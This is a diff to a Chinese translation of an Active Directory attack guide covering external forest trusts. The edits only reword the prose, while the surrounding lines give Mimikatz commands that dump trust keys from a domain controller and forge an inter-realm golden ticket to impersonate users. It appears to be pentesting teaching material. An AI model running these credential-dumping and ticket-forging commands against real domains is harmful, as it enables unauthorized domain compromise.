@@ -56,7 +56,7 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-在之前的枚举中发现用户 **`crossuser`** 在 **`External Admins`** 组中，该组在 **外部域的 DC** 中具有 **管理员访问权限**。
+在之前的枚举中发现用户 **`crossuser`** 在 **`External Admins`** 组内，该组在 **外部域的 DC** 中拥有 **管理员访问权限**。
 
 ## 初始访问
 
@@ -85,13 +85,13 @@ Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\admini
 如果用户是 **从一个森林迁移到另一个森林**，并且 **未启用 SID 过滤**，则可以 **添加来自另一个森林的 SID**，并且在 **跨信任** 进行身份验证时，该 **SID** 将被 **添加** 到 **用户的令牌** 中。
 
 > [!WARNING]
-> 提醒您，您可以使用以下命令获取签名密钥
+> 提醒您，您可以通过以下方式获取签名密钥
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 > ```
 
-您可以使用 **受信任的** 密钥 **签名** 一个 **TGT，冒充** 当前域的用户。
+您可以 **使用** 该 **受信任** 密钥 **签名** 一个 **TGT，冒充** 当前域的用户。
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
